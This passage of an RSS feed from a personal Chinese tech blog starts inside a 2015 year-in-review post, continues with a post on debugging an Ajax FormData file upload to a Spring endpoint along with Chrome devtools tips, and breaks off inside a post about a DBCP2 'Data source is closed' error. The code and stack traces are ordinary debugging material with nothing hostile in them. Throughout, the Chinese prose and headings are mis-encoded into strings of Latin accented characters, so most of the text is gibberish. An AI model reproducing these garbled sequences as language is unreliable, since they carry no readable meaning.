&lt;li&gt;ä¸‹åŠå¹´ä¸€ç›´æƒ³ç€æå‡ç”Ÿæ´»è´¨é‡,å¼€å§‹å¼€è½¦ä¸Šä¸‹ç­,ä½†æ˜¯æ¯å¤©å› ä¸ºè½¦ä½é—®é¢˜,è¿˜æœ‰è½¦æ²¡ä»€ä¹ˆæ™ºèƒ½è¾…åŠ©è®¾å¤‡,è¯¸å¤šä¸ä¾¿,ä¸€ç‚¹ä¹Ÿæ²¡æœ‰ä½“ä¼šåˆ°é©¾é©¶çš„ä¹è¶£ï¼›çœ¼çœ‹ç€æˆ¿ä»·ä¸€ç‚¹ç‚¹æ¶¨,å´é¡¾å‰é¡¾åæ²¡æœ‰æ¢æˆ¿çš„å‹‡æ°”,åˆ°å¹´åº•æˆ¿ä»·å½»åº•æ¶¨èµ·æ¥ä¹‹å,ç»ˆäºç»äº†æ¢æˆ¿çš„å¿µå¤´.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;ä»å¾®åšä¸å¾®ä¿¡å›å¿†2015&#34;&gt;ä»å¾®åšä¸å¾®ä¿¡å›å¿†2015&lt;/h2&gt;

&lt;h3 id=&#34;å¹´åˆæ„Ÿæ…¨é¢‡å¤š&#34;&gt;å¹´åˆæ„Ÿæ…¨é¢‡å¤š&lt;/h3&gt;

&lt;p&gt;æ„Ÿæ…¨å¸¸ç«‹å¿—ï¼š&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;å…¶å®è¿™ä¸ªæ—¶å€™æœ€æœ‰ä»·å€¼çš„ä¸æ˜¯ä»€ä¹ˆä¸‹å†³å¿ƒåšæ–°ä¸œè¥¿,è€Œæ˜¯é‚£äº›è¿‡å»å·²ç»å¼€å§‹å€¼å¾—ä¿æŒä¸‹å»çš„æ—§ä¸œè¥¿&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;æ„Ÿæ…¨è‡ªå·±ï¼š&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;è¿™ä¸ªä¸–ç•Œä¸Šè‡ªä¿¡ä¸çœŸè¯šçš„äººçœŸæ˜¯å¤ªå°‘äº†ï¼ å¯¹è‡ªå·±è¦æ±‚å¤ªå®Œç¾,ä¸é¢å¯¹ç°å®,å–œæ¬¢åšé¸µé¸Ÿ.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;æ„Ÿæ…¨è£å‘˜é£æ³¢çš„å…¬å¸ï¼š&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;å„è·¯ç¥ä»™ä¸Šè¹¿ä¸‹è·³,å„è·¯è·³æ¢ç²‰å¢¨ç™»åœº,å„è‰²äººç­‰å„æ˜¾ç¥é€š.éšæ³¢é€æµæˆ–å¥‹åŠ›è·ƒå‡º,åŠ³ç‡•åˆ†é£ç¨»ç²±è°‹ï¼&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;æŸ´é™é›¾éœ¾è°ƒæŸ¥&#34;&gt;æŸ´é™é›¾éœ¾è°ƒæŸ¥&lt;/h3&gt;

&lt;p&gt;è®°å¾—ä¸­å­¦æ”¿æ²»è¯¾æœ¬ä¸€ç›´åœ¨ç¬‘è¯èµ„æœ¬ä¸»ä¹‰å…ˆæ±¡æŸ“åæ²»ç†,å¥¥è¿å‰å¤•æœ‰è¿åŠ¨å‘˜è¯´åŒ—äº¬ç©ºæ°”å·®è¿˜è·Ÿé£å»éª‚.åœ¨ç°åœ¨çš„æ”¿æ²»ä½“åˆ¶ä¸‹,å¦‚æœæ‰§æ”¿è€…é¡¾è™‘é‡é‡å¹¶æ— åŠ¨äºè¡·,å±æ°‘åªèƒ½é€†æ¥é¡ºå—éº»æœ¨ä¸ä».&lt;/p&gt;

&lt;h3 id=&#34;å¹³å‡¡ä¸–ç•Œç”µè§†å‰§ç‰ˆæ’­å‡º&#34;&gt;å¹³å‡¡ä¸–ç•Œç”µè§†å‰§ç‰ˆæ’­å‡º&lt;/h3&gt;

&lt;p&gt;ç”µè§†å‰§æœ‰äº®ç‚¹,ä½†è·Ÿä¹¦ä¸­çš„æ„Ÿè§‰å·®è·å¾ˆå¤§.åˆé«˜ä¸­æ—¶å€™è¯»äº†å¹³å‡¡æœ‰ä¸¤éä»¥ä¸Š,å°è±¡ä¸­,ä¹¦ä¸­å¯¹å®˜å®¦é˜¶çº§å°å§çš„YYå’Œå¯¹çˆ±è¯»ä¹¦çš„è‡ªå‚²,æ»¡è¶³äº†åœ¨å°åŸé•¿å¤§çš„æˆ‘çš„å¾ˆå¤šä¸åˆ‡å®çš„å¹»æƒ³.äº‹å®ä¸Š,è·¯é¥è‡ªå·±çš„äººç”Ÿæ¯”å­™å°‘å¹³ä»¬æ›´ç²¾å½©.&lt;/p&gt;

&lt;h3 id=&#34;çˆ¶äº²65å²ç”Ÿæ—¥&#34;&gt;çˆ¶äº²65å²ç”Ÿæ—¥&lt;/h3&gt;

&lt;p&gt;ä»“ä¿ƒå›éƒ‘,æ·±æ·±è§‰å¾—ç°ä»£åŒ–è¿‡ç¨‹ä¸­,æˆ‘ä»¬æ¬ çˆ¶æ¯çš„å¤ªå¤šå¤ªå¤š.
14å¹´11æœˆçš„æ„Ÿæ…¨ï¼š
&amp;gt;ä¸Šä¸€è¾ˆçš„ç—›è‹¦å’Œçƒ¦æ¼:ä¸‰åˆ†ä¹‹ä¸€æ˜¯å› ä¸ºæ—¶è¿ä¸æµ,é‡åˆ°çš„é€šè¿‡ä¸ªäººåŠªåŠ›å°±èƒ½æŠ“ä½çš„æœºä¼šå¤ªå°‘ï¼›ä¸‰åˆ†ä¹‹ä¸€æ˜¯å› ä¸ºè´«ç©·,å¾ˆé•¿ä¸€æ®µç”Ÿå‘½éƒ½åœ¨ä¸ºæ¸©é¥±è€ŒæŒ£æ‰ï¼›ä¸‰åˆ†ä¹‹ä¸€æ˜¯å› ä¸ºå¯¹å®¶åº­å¯¹äº²äººä»˜å‡ºå¤ªå¤š.&lt;/p&gt;

&lt;p&gt;ä¹‹å‰çœ‹äº†&lt;a href=&#34;http://www.douban.com/note/468023670/&#34;&gt;ä¸‰æ¯›çˆ¶äº²ç»™ä¸‰æ¯›çš„ä¿¡&lt;/a&gt;,å°è±¡é¢‡æ·±.&lt;/p&gt;

&lt;h3 id=&#34;å°¤æ–‡æ‰“å…¥æ¬§å† å†³èµ›&#34;&gt;å°¤æ–‡æ‰“å…¥æ¬§å† å†³èµ›&lt;/h3&gt;

&lt;p&gt;æœ‰æœºä¼š,å®åŠ›å·®è·å¤ªæ˜æ˜¾.&lt;/p&gt;

&lt;h3 id=&#34;å…¨æ°‘åˆ›ä¸š&#34;&gt;å…¨æ°‘åˆ›ä¸š&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;æ˜¨å¤©è§äº†ä¸€ä¸ªåšå®ä¸šçš„è€æ¿,åœ¨è‡ªå·±èŠ±é’±åšç§»åŠ¨äº’è”ç½‘.è¯´å®ä¸šåˆ©æ¶¦ä¸‹é™,è¯´å¬åˆ°å›½å®¶äº’è”ç½‘+çš„å£å·å¾ˆå®³æ€•éƒ½è¿›æ¥&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;æ¥åˆ°ç°åœ¨å…¬å¸ä¹Ÿæ˜¯å—å…¨æ°‘åˆ›ä¸šé£æ½®çš„å½±å“,äº‹å®ä¸Šæˆ‘æ„Ÿè§‰å¸‚é¢ä¸Š80%çš„APPéƒ½æ˜¯åƒåœ¾.çœŸæ­£èƒ½æé«˜ç”Ÿæ´»è´¨é‡å’Œæ•ˆç‡çš„APPåœ¨å“ªé‡Œï¼Ÿ&lt;/p&gt;

&lt;h3 id=&#34;æ–°å…¬å¸&#34;&gt;æ–°å…¬å¸&lt;/h3&gt;

&lt;p&gt;æ–°çš„ç¯å¢ƒ,æ–°çš„åŒäº‹,æ–°çš„æŒ‘æˆ˜&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;å…±äº‹ä¸æ˜¯è¦è¯æ˜è‡ªå·±æ¯”åˆ«äººä¼˜ç§€,è€Œæ˜¯åŒèµ¢.&lt;/p&gt;

&lt;p&gt;åæ€ä¸æ˜¯è¦æ‰¾ç†ç”±å»è¯´æ˜è‡ªå·±åšå¯¹äº†&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;æ¯äº²çš„æ¥ç”µ&#34;&gt;æ¯äº²çš„æ¥ç”µ&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;æ˜¨å¤©å„ç§å‡ºäº‹,å¿™å¾—æ™•å¤´è½¬å‘,çªç„¶æ¥åˆ°æ¯äº²ç”µè¯,é—®å…³äºQQçš„ä¸€ä¸ªç®€å•é—®é¢˜.çªç„¶è§‰å¾—,ä»€ä¹ˆæ˜¯ç”Ÿæ´»å‘¢ï¼Ÿ(8.24)&lt;/p&gt;

&lt;p&gt;æµ‘æµ‘å™©å™©ä¸­,åœ¨è¿™ä¸ªä¸–ç•Œä¸Šåªæœ‰ä¸¤ç§ä¸œè¥¿æœ€èƒ½éœ‡æ’¼äººä»¬çš„å¿ƒçµ,ä¸€æ˜¯ä¸è€å®¶çš„è”ç³»;äºŒä¾¿æ˜¯æˆ‘ä»¬å¤´é¡¶ä¸Šç¿çƒ‚çš„é›¾éœ¾.(12.1)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;è‚¡å¸‚å’Œæˆ¿äº‹-ç»æµå¤´è„‘&#34;&gt;è‚¡å¸‚å’Œæˆ¿äº‹,ç»æµå¤´è„‘&lt;/h3&gt;

&lt;p&gt;å¹´åˆç¨èµšäº†ä¸€ç¬”,ä½†æ˜¯å¹´ä¸­3000ç‚¹æ—¶å€™æ²¡æœ‰å›å».&lt;/p&gt;

&lt;p&gt;ä»Šå¹´ä¹Ÿæ²¡æœ‰æ¢æˆ¿.å‰é¢æœ‰12å¹´çš„æ•™è®­,ä»Šå¹´åˆæ˜¯èº«è¾¹å¥½å‡ ä¸ªäººä¹°æˆ¿.ä¹‹å‰ä¹Ÿå¶å°”åœ¨å…³æ³¨æˆ¿ä»·,å°åŒºçš„æˆ¿ä»·ä»300Wåˆ°350W,è‡ªå·±å…³æ³¨çš„å‡ å¥—æˆ¿æ¶¨çš„æ¶¨å–çš„å–,è¿™éƒ½æ˜¯å®å®åœ¨åœ¨å‘ç”Ÿçš„äº‹,ä½†æ˜¯æ‰§è¡ŒåŠ›ä¸€ç‚¹ä¹Ÿæ²¡æœ‰.
&amp;gt;æ‰§è¡ŒåŠ›.ä¸€å®šè¦ä¸æœ‰ç»æµå¤´è„‘çš„äººä¸ºä¼.è™½ç„¶è‡ªç§°ä¸–ç•Œè§‚å·²ç»ç¨³å®š,ä½†æ˜¯å¯ä»¥å­¦ä¹ çš„ä¸œè¥¿å¤šç€å‘¢.&lt;/p&gt;

&lt;h3 id=&#34;ç”µå½±è€ç‚®å„¿&#34;&gt;ç”µå½±è€ç‚®å„¿&lt;/h3&gt;

&lt;p&gt;è¿™ç‰‡ä¸Šæ˜ ä»¥æ¥å¥½è¯„å¦‚æ½®,ç›´æ¥è®©æˆ‘è§‰å¾—è‡ªå·±ä¸‰è§‚ä¸æ­£äº†.è¿˜å¥½è¿™å‡ å¤©æ‰¹è¯„çš„å¤šèµ·æ¥äº†.&lt;/p&gt;

&lt;p&gt;å…¶å®ä¸æ˜¯ä»·å€¼è§‚å¤šæ ·åŒ–çš„é—®é¢˜,è€Œæ˜¯å®åœ¨è§‰å¾—è¿™ç‰‡çš„ç¼–å‰§å¤ªç²—åˆ¶æ»¥é€ ,æ´»æ´»æŠŠå¯¹æ‰‹å†™æˆè„‘æ®‹åŠ å‚»é€¼äº†.
æ‹¿ã€Šç«æ˜Ÿæ•‘æ´ã€‹æ¥è¯´,æƒ³åŠæ³•åœ¨ç«æ˜Ÿä¸Šç§åœŸè±†,å¯ä»¥æŠŠä¹å‡ å¹´çš„ç«æ˜Ÿæ¢æµ‹å™¨ç»™åŠ è¿›æ¥..è€ç‚®å„¿çš„ç¼–å‰§ä¸æ˜¯åšä½œçš„æ˜æ˜¾å°±æ˜¯å®Œå…¨ä¸åˆé€»è¾‘.&lt;/p&gt;

&lt;h3 id=&#34;å¼€è½¦&#34;&gt;å¼€è½¦&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;å¼ çˆ±ç²è¯´è¿‡,å‡ºåè¦è¶æ—©.å…¶å®å¾ˆå¤šäº‹æƒ…éƒ½æ˜¯è¿™æ ·.ä¹‹å‰ä¸€ç›´å¯¹å¼€è½¦è¿™ä»¶äº‹æ¯”è¾ƒæŠµè§¦,ä»å»å¹´æ‹¿åˆ°è½¦,ä¸€ç›´åˆ°ä»Šå¹´11æœˆä»½è¶ç€å¤§å±¯è·¯å°ç«™æ‰å¼€å§‹å¼€.&lt;/li&gt;
&lt;li&gt;æ„Ÿè§‰å·²ç»å¾ˆå¤šå¹´æ²¡æœ‰æ–°æŠ€èƒ½getâˆšäº†.ä¸Šä¸€æ¬¡è¿˜æ˜¯å­¦ç©ä¸‰å›½æ€ï¼Ÿè‡ªå·±çœ‹pythonå’ŒAndroidéƒ½æ˜¯åŠé€”è€ŒåºŸ.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;æ€»ç»“&#34;&gt;æ€»ç»“&lt;/h2&gt;

&lt;p&gt;å¯¹çˆ¶æ¯å’Œå®¶åº­æœ‰äºæ¬ ,å·¥ä½œä¸å¤Ÿèµ°å¿ƒ,åœ¨ä¸èµšé’±èƒ½åŠ›æ— å…³ä¸œè¥¿ä¸ŠæŠ•å…¥çš„ç²¾åŠ›å¤ªå¤š.&lt;/p&gt;

&lt;p&gt;ä¸€å¤§æ³¢èªæ˜çš„å°å­©æ¯•ä¸šè¿›å…¥BAT,ä¸€å¤§æ³¢åŠªåŠ›çš„è€ç å†œè½¬è¡Œåšäº’è”ç½‘.ç°åœ¨æœºä¼šå¾ˆå¥½,å·¥ä½œæ¯”è¾ƒå®½æ¾,å¸Œæœ›2016èƒ½çœŸå¿ƒå–œæ¬¢å¹¶æŠ•å…¥åˆ°ä¸èµšé’±èƒ½åŠ›æœ‰å…³çš„äº‹ä¸šä¸­å».&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>ä¸€æ¬¡Ajaxä¸Šä¼ æ–‡ä»¶çš„è°ƒè¯•è¿‡ç¨‹</title>
      <link>https://lawulu.github.io/post/%E4%B8%80%E6%AC%A1Ajax%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/</link>
      <pubDate>Sat, 19 Dec 2015 00:00:00 +0000</pubDate>
      
      <guid>https://lawulu.github.io/post/%E4%B8%80%E6%AC%A1Ajax%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B/</guid>
      <description>

&lt;p&gt;å¾ˆä¹…ä¸åšWebäº†,å¸®ä¸€å°å¼Ÿè§£å†³çš„ä¸€ä¸ªé—®é¢˜.å‘ç°æ–°äººè§£å†³é—®é¢˜éƒ½æ˜¯åœ¨Search and Try,æ®ä»–è¯´æ— è„‘æœäº†å¾ˆä¹…,ä½†æ˜¯ä¸ä¼šåˆ©ç”¨Chrome,ä¹Ÿä¸ä¼šåˆ†æé—®é¢˜.&lt;/p&gt;

&lt;h2 id=&#34;ç°è±¡å’Œä»£ç &#34;&gt;ç°è±¡å’Œä»£ç &lt;/h2&gt;

&lt;h3 id=&#34;jsç«¯&#34;&gt;Jsç«¯&lt;/h3&gt;

&lt;p&gt;ä½¿ç”¨çš„FormData&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;var formData = new FormData();
    var actionUrl = &amp;quot;/report/agentUpload&amp;quot;;
    var form = new FormData();
    form.append(&amp;quot;file&amp;quot;, $(&amp;quot;#reportFile&amp;quot; )[0]);

    var xhr = new XMLHttpRequest();
    xhr.open(&amp;quot;post&amp;quot;, actionUrl, true);
    xhr.onload = function () {
         alert(&amp;quot;ä¸Šä¼ å®Œæˆ!&amp;quot;);
    };

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;serverç«¯&#34;&gt;Serverç«¯&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;public String upload(HttpServletRequest request, @RequestParam(value=&amp;quot;file&amp;quot;,required = true) MultipartFile file, ModelMap model)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä½†æ˜¯å°±æ˜¯å–ä¸åˆ°,æŠ¥é”™ï¼š&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Required MultipartFile parameter &#39;file&#39; is not present
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;serverç«¯çš„é—®é¢˜&#34;&gt;Serverç«¯çš„é—®é¢˜ï¼Ÿ&lt;/h2&gt;

&lt;p&gt;æ˜¯å¦å‘åˆ°äº†Serverï¼Ÿ&lt;/p&gt;

&lt;p&gt;çœ‹Chrome Networké¢æ¿é‡Œé¢è¿™æ¬¡è¯·æ±‚çš„Requestï¼š&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;------WebKitFormBoundaryNLPhxKE21THaBaN1
Content-Disposition: form-data; name=&amp;quot;file&amp;quot;

[object HTMLInputElement]

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è²Œä¼¼æ˜¯æ­£ç¡®çš„,åœ¨Serverç«¯ç¡®è®¤ä¸€ä¸‹,å°†å‚æ•°åŠ ä¸Šrequired=false
æŸ¥çœ‹request:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;multipartParameters = {HashMap@8882}  size = 1
multipartParameterContentTypes = {HashMap@8883}  size = 1
multipartFiles = {LinkedMultiValueMap@8884}  size = 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Requesté‡Œé¢æœ‰ä¸œè¥¿,ä½†æ˜¯multipartFilesæ²¡æœ‰ä¸œè¥¿â€¦â€¦&lt;/p&gt;

&lt;p&gt;&lt;em&gt;å…¶å®è¿™æ—¶å€™åº”è¯¥å·²ç»çœ‹å‡ºé—®é¢˜äº†,å› ä¸ºé‚£ä¸ªå€¼æ˜¯ä¸€ä¸ªString,ä½†æ˜¯æ²¡æ³¨æ„,è‡ªå·±ç›²ç›®ä»¥ä¸ºåªè¦å¸¦multipartParameterså°±æ˜¯æ–‡ä»¶&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;debugåˆ°CommonsMultipartResolverçš„resolveMultipartæ–¹æ³•,é‡Œé¢æœ‰è¿™æ®µåˆ¤æ–­&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;protected MultipartParsingResult parseFileItems(List&amp;lt;FileItem&amp;gt; fileItems, String encoding) {
		MultiValueMap&amp;lt;String, MultipartFile&amp;gt; multipartFiles = new LinkedMultiValueMap&amp;lt;String, MultipartFile&amp;gt;();
		Map&amp;lt;String, String[]&amp;gt; multipartParameters = new HashMap&amp;lt;String, String[]&amp;gt;();
		Map&amp;lt;String, String&amp;gt; multipartParameterContentTypes = new HashMap&amp;lt;String, String&amp;gt;();

		// Extract multipart files and multipart parameters.
		for (FileItem fileItem : fileItems) {
			if (fileItem.isFormField()) {
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¦‚æœæ˜¯falseâ€¦å°±å¾€MultipartFileé‡Œé¢å¡«å€¼.
éš¾é“æ˜¯Content-typeçš„é—®é¢˜ï¼Ÿ&lt;/p&gt;

&lt;h3 id=&#34;å»jsç«¯&#34;&gt;å»Jsç«¯&lt;/h3&gt;

&lt;p&gt;å…ˆæ‰¾åˆ°å¦‚ä½•æ‰“å°Formdataçš„ï¼š
&lt;a href=&#34;http://stackoverflow.com/questions/17066875/how-to-inspect-formdata&#34;&gt;http://stackoverflow.com/questions/17066875/how-to-inspect-formdata&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;for (var pair of formData.entries()) {
    console.log(pair[0]+ &#39;, &#39; + pair[1]); 
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æ‰“å°çš„ä¸œè¥¿æ˜¯ï¼š&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;file, [object HTMLInputElement]

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å†³å®šé‡‡ç”¨åŸå§‹çš„document.getElementById(&amp;ldquo;reportFile&amp;rdquo;).files[]&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;lastModifiedDate: Tue Dec 20 2015 10:39:39 GMT+0800 (CST)name: &amp;quot;å·¥ä½œç°¿1.xlsx&amp;quot;size: 23168type: &amp;quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&amp;quot;webkitRelativePath: &amp;quot;&amp;quot;__proto__: File

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æœ€ç»ˆå‘ç°é—®é¢˜ï¼š
åº”è¯¥ç”¨&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; $(&amp;quot;#reportFile&amp;quot; )[0].files[0]

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;ç»“è®º&#34;&gt;ç»“è®º&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;ç›²ç›®çš„å»æœç´¢å…¶å®éå¸¸æµªè´¹æ—¶é—´&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;è¦å–„ç”¨Chrome Console&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;chromeçš„ä¸€äº›è°ƒè¯•æŠ€å·§&#34;&gt;Chromeçš„ä¸€äº›è°ƒè¯•æŠ€å·§&lt;/h2&gt;

&lt;h3 id=&#34;å¦‚ä½•æ‰¾åˆ°å¯¹åº”çš„å…ƒç´ è§¦å‘çš„function&#34;&gt;å¦‚ä½•æ‰¾åˆ°å¯¹åº”çš„å…ƒç´ è§¦å‘çš„functionï¼Ÿ&lt;/h3&gt;

&lt;p&gt;å¯ä»¥åœ¨EventListerneré‡Œé¢æŠŠClickå½“åšæ–­ç‚¹ï¼Œä¹Ÿå¯ä»¥ç‚¹å‡»æŸä¸ªå…ƒç´ ï¼Œæ‰¾åˆ°å¯¹åº”ç›‘å¬çš„EventListener,æˆ–è€…å¯¹æŸä¸€ä¸ªç‰‡domç‚¹å‡»&lt;code&gt;Break on subtree modification&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&#34;ç¼“å­˜ç›¸å…³&#34;&gt;ç¼“å­˜ç›¸å…³&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;å¼ºåˆ¶åˆ·æ–° cmd+shift+r&lt;/li&gt;

&lt;li&gt;&lt;p&gt;å¯ä»¥åœ¨è®¾ç½®ä¸­ç¦æ­¢ç¼“å­˜&lt;/p&gt;

&lt;h3 id=&#34;console&#34;&gt;console&lt;/h3&gt;

&lt;p&gt;åœ¨æŸä¸ªé¡µé¢ï¼Œå¯ä»¥åœ¨consoleé¡µé¢éšæ—¶è°ƒè¯•,ç”šè‡³å¯ä»¥æ‰§è¡Œå‡½æ•°ï¼š&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code&gt;$(&#39;.choose_endcard&#39;).click()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But,ä¸ºä»€ä¹ˆXpathé€‰æ‹©çš„ä¸èƒ½è°ƒç”¨Clickâ€¦&lt;/p&gt;

&lt;h3 id=&#34;settingé‡Œé¢å¯ä»¥å¯¹console-logåŠ ä¸Štimestamp&#34;&gt;Settingé‡Œé¢å¯ä»¥å¯¹console.logåŠ ä¸ŠTimestamp&lt;/h3&gt;
</description>
    </item>
    
    <item>
      <title>ä¸€ä¸ªè¯¡å¼‚çš„Data source is closedé—®é¢˜</title>
      <link>https://lawulu.github.io/post/%E4%B8%80%E4%B8%AA%E8%AF%A1%E5%BC%82%E7%9A%84Data%20source%20is%20closed%E9%97%AE%E9%A2%98/</link>
      <pubDate>Mon, 19 Oct 2015 00:00:00 +0000</pubDate>
      
      <guid>https://lawulu.github.io/post/%E4%B8%80%E4%B8%AA%E8%AF%A1%E5%BC%82%E7%9A%84Data%20source%20is%20closed%E9%97%AE%E9%A2%98/</guid>
      <description>

&lt;h3 id=&#34;é—®é¢˜ç”±èµ·&#34;&gt;é—®é¢˜ç”±èµ·&lt;/h3&gt;

&lt;p&gt;å› ä¸ºæŸäº›é—®é¢˜(è¿™ä¸ªé—®é¢˜ç¨åå†æ),å°†çº¿ä¸Šçš„DBCPç‰ˆæœ¬ä»1.4å‡çº§åˆ°2.1,å¤§æ¦‚æ‰«äº†ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£,æ²¡æœ‰è¿ç§»æŒ‡å—,åªæ˜¯å‡ ä¸ªå±æ€§åç§°å˜äº†,æ„Ÿè§‰é—®é¢˜ä¸å¤§,ç›´æ¥å‡çº§.å‡çº§ä¹‹å,UTä¸€ä¸‹,é€šè¿‡.ä½†æ˜¯ä¸Šçº¿ä¹‹åä¸€ç›´æŠ¥ä¸‹é¢é”™è¯¯ï¼š
&amp;gt;Cause: org.springframework.jdbc.CannotGetJdbcConnectionException: Could not get JDBC Connection; nested exception is java.sql.SQLException: Data source is closed
    at org.apache.ibatis.exceptions.ExceptionFactory.wrapException(ExceptionFactory.java:23)
    at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:107)
    at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:98)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:386)
    &amp;hellip; 43 more&lt;/p&gt;

&lt;h3 id=&#34;é—®é¢˜èƒŒæ™¯&#34;&gt;é—®é¢˜èƒŒæ™¯&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;é¡¹ç›®å› ä¸ºéœ€è¦åŠ¨æ€åˆ‡æ¢æ•°æ®æº,ä½¿ç”¨çš„æ˜¯++AbstractRoutingDataSource++&lt;/li&gt;

&lt;li&gt;&lt;p&gt;éœ€è¦åŠ¨æ€åˆ‡æ¢çš„æ•°æ®æºæ¯”è¾ƒå¤š,é¡¹ç›®åˆå§‹åŒ–æ—¶å€™é€šè¿‡++BeanDefinitionBuilder++æ¥æ ¹æ®æ•°æ®åº“é…ç½®åŠ¨æ€åˆ›å»ºæ•°æ®æº,è€ŒæŠ¥é”™çš„è¿æ¥æ­£æ˜¯åŠ¨æ€ç”Ÿæˆçš„çš„æ•°æ®æº.&lt;/p&gt;

&lt;h3 id=&#34;é—®é¢˜å®šä½&#34;&gt;é—®é¢˜å®šä½&lt;/h3&gt;

&lt;h4 id=&#34;ä¸ºä»€ä¹ˆutæµ‹è¯•æˆåŠŸ&#34;&gt;ä¸ºä»€ä¹ˆUTæµ‹è¯•æˆåŠŸ&lt;/h4&gt;

&lt;p&gt;åŸæ¥æ˜¯UTçš„æ—¶å€™,å› ä¸ºé…ç½®æ–‡ä»¶,æµ‹è¯•å…¶å®èµ°çš„æ˜¯++AbstractRoutingDataSource++çš„é»˜è®¤çš„æ•°æ®æº,å¹¶æ²¡æœ‰èµ°åŠ¨æ€ç”Ÿæˆçš„æ•°æ®æº&lt;/p&gt;

&lt;h4 id=&#34;æ€€ç–‘æ˜¯å‚æ•°é—®é¢˜æˆ–è€…å…¶ä»–åŸå› &#34;&gt;æ€€ç–‘æ˜¯å‚æ•°é—®é¢˜æˆ–è€…å…¶ä»–åŸå› &lt;/h4&gt;

&lt;p&gt;åªè®¾ç½®JDBC Url,ä¾æ—§æŠ¥é”™ï¼›æ¢æˆdbcp,ä¸æŠ¥é”™.&lt;/p&gt;

&lt;h4 id=&#34;abstractroutingdatasourceçš„é—®é¢˜&#34;&gt;AbstractRoutingDataSourceçš„é—®é¢˜ï¼Ÿ&lt;/h4&gt;

&lt;p&gt;ä½¿ç”¨XMLé…ç½®,æ²¡æœ‰é—®é¢˜&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;è‡³æ­¤,åŸºæœ¬ç¡®è®¤æ˜¯++DBCP2++å’Œ++BeanDefinitionBuilder++&lt;/strong&gt;çš„é—®é¢˜&lt;/p&gt;

&lt;h3 id=&#34;æŸ¥çœ‹æºç å’Œdebug&#34;&gt;æŸ¥çœ‹æºç å’ŒDebug&lt;/h3&gt;

&lt;h4 id=&#34;basicdatasource-dbcp1å’Œ2æœ‰ä»€ä¹ˆåŒºåˆ«&#34;&gt;BasicDataSource DBCP1å’Œ2æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ&lt;/h4&gt;

&lt;p&gt;DBCP2å®ç°äº†æ›´å¤šçš„æ¥å£ï¼š&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;public class BasicDataSource implements DataSource, BasicDataSourceMXBean, MBeanRegistration, AutoCloseable 

&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;æŸ¥çœ‹dbcp2åˆ›å»ºé“¾æ¥å’Œé”€æ¯çš„åœ°æ–¹&#34;&gt;æŸ¥çœ‹DBCP2åˆ›å»ºé“¾æ¥å’Œé”€æ¯çš„åœ°æ–¹&lt;/h4&gt;

&lt;p&gt;æ˜¯æ²¡æœ‰Create Connectionè¿˜æ˜¯ä»€ä¹ˆæ—¶å€™è¢«Closeäº†ï¼Ÿ
è¢«Closeäº†&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
